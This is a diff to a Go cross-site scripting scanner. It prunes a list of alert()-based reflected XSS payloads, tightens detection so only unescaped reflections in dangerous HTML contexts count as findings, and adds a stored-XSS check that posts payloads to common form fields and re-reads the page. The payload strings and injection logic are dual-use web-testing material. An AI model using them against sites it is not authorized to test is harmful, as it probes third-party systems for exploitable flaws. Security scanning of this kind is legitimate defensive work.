@@ -16,13 +16,13 @@ type XSSScanner struct {
 }
 
 type XSSResult struct {
-	URL         string
-	Parameter   string
-	Type        string
-	Payload     string
-	Evidence    string
-	Severity    string
-	Confirmed   bool
+	URL       string
+	Parameter string
+	Type      string
+	Payload   string
+	Evidence  string
+	Severity  string
+	Confirmed bool
 }
 
 func NewXSSScanner(target string) *XSSScanner {
@@ -52,24 +52,7 @@ func (xs *XSSScanner) testReflectedXSS() {
 		"<svg onload=alert('XSS')>",
 		"<body onload=alert('XSS')>",
 		"<iframe src=javascript:alert('XSS')>",
-		"<input onfocus=alert('XSS') autofocus>",
-		"<select onfocus=alert('XSS') autofocus>",
-		"<textarea onfocus=alert('XSS') autofocus>",
-		"<keygen onfocus=alert('XSS') autofocus>",
-		"<video><source onerror=alert('XSS')>",
-		"<audio src=x onerror=alert('XSS')>",
-		"<marquee onstart=alert('XSS')>",
-		"<meter onmouseover=alert('XSS')>",
-		"<details ontoggle=alert('XSS')>",
-		"<object data=javascript:alert('XSS')>",
-		"<embed src=javascript:alert('XSS')>",
-		"<form><button formaction=javascript:alert('XSS')>",
-		"<math><mtext><table><mglyph><style><img src=x onerror=alert('XSS')>",
-		"javascript:alert('XSS')",
 		"<a href=javascript:alert('XSS')>click</a>",
-		"<sc<script>ript>alert('XSS')</sc</script>ript>",
-		"<img src=\"x onerror=alert('XSS')\">",
-		"<svg><script>alert('XSS')</script>",
 	}
 
 	parsedURL, err := url.Parse(xs.target)
@@ -96,21 +79,33 @@ func (xs *XSSScanner) testReflectedXSS() {
 				continue
 			}
 
+			contentType := strings.ToLower(resp.Header.Get("Content-Type"))
 			bodyStr := string(body)
-			if strings.Contains(bodyStr, payload) || strings.Contains(bodyStr, url.QueryEscape(payload)) {
-				result := XSSResult{
-					URL:       testURL,
-					Parameter: param,
-					Type:      "Reflected XSS",
-					Payload:   payload,
-					Evidence:  "Payload reflected in response",
-					Severity:  "High",
-					Confirmed: false,
-				}
-				xs.results = append(xs.results, result)
-				fmt.Printf("⚠️  发现XSS: %s (参数: %s)\n", testURL, param)
-				return
+			if !strings.Contains(contentType, "html") {
+				continue
 			}
+			if isEscapedReflection(bodyStr, payload) {
+				continue
+			}
+			if !strings.Contains(bodyStr, payload) {
+				continue
+			}
+			if !containsDangerousHTMLContext(bodyStr, payload) {
+				continue
+			}
+
+			result := XSSResult{
+				URL:       testURL,
+				Parameter: param,
+				Type:      "Reflected XSS",
+				Payload:   payload,
+				Evidence:  "Payload 以未转义 HTML/JS 上下文反射",
+				Severity:  "High",
+				Confirmed: true,
+			}
+			xs.results = append(xs.results, result)
+			fmt.Printf("⚠️  发现XSS: %s (参数: %s)\n", testURL, param)
+			return
 		}
 	}
 }
@@ -144,18 +139,89 @@ func (xs *XSSScanner) testStoredXSS() {
 		for _, payload := range storedPayloads {
 			testURL := baseURL + form
 			resp, err := xs.httpClient.PostForm(testURL, url.Values{
-				"q":      {payload},
-				"search": {payload},
-				"name":   {payload},
-				"email":  {payload},
-				"message":{payload},
+				"q":       {payload},
+				"search":  {payload},
+				"name":    {payload},
+				"email":   {payload},
+				"message": {payload},
 			})
 			if err != nil {
 				continue
 			}
 			resp.Body.Close()
+
+			readResp, err := xs.httpClient.Get(testURL)
+			if err != nil {
+				continue
+			}
+			body, err := io.ReadAll(readResp.Body)
+			readResp.Body.Close()
+			if err != nil {
+				continue
+			}
+
+			bodyStr := string(body)
+			contentType := strings.ToLower(readResp.Header.Get("Content-Type"))
+			if !strings.Contains(contentType, "html") {
+				continue
+			}
+			if isEscapedReflection(bodyStr, payload) {
+				continue
+			}
+			if !strings.Contains(bodyStr, payload) {
+				continue
+			}
+			if !containsDangerousHTMLContext(bodyStr, payload) {
+				continue
+			}
+
+			result := XSSResult{
+				URL:       testURL,
+				Parameter: "message",
+				Type:      "Stored XSS",
+				Payload:   payload,
+				Evidence:  "Payload 提交后再次访问页面时以未转义 HTML/JS 上下文出现",
+				Severity:  "High",
+				Confirmed: true,
+			}
+			xs.results = append(xs.results, result)
+			fmt.Printf("⚠️  发现存储型XSS: %s\n", testURL)
+			return
 		}
 	}
+}
+
+func isEscapedReflection(body, payload string) bool {
+	escapedForms := []string{
+		url.QueryEscape(payload),
+		strings.ReplaceAll(strings.ReplaceAll(payload, "<", "&lt;"), ">", "&gt;"),
+	}
+	for _, escaped := range escapedForms {
+		if escaped != payload && strings.Contains(body, escaped) && !strings.Contains(body, payload) {
+			return true
+		}
+	}
+	return false
+}
+
+func containsDangerousHTMLContext(body, payload string) bool {
+	dangerousPatterns := []string{
+		"<script>alert('xss')</script>",
+		"<script>alert('storedxss')</script>",
+		"onerror=alert('xss')",
+		"onerror=alert('storedxss')",
+		"onload=alert('xss')",
+		"onload=alert('storedxss')",
+		"href=javascript:alert('xss')",
+	}
+	bodyLower := strings.ToLower(body)
+	payloadLower := strings.ToLower(payload)
+	for _, pattern := range dangerousPatterns {
+		if strings.Contains(payloadLower, pattern) && strings.Contains(bodyLower, pattern) {
+			return true
+		}
+	}
+	return false
 }
 
 func (xs *XSSScanner) GetResults() []XSSResult {
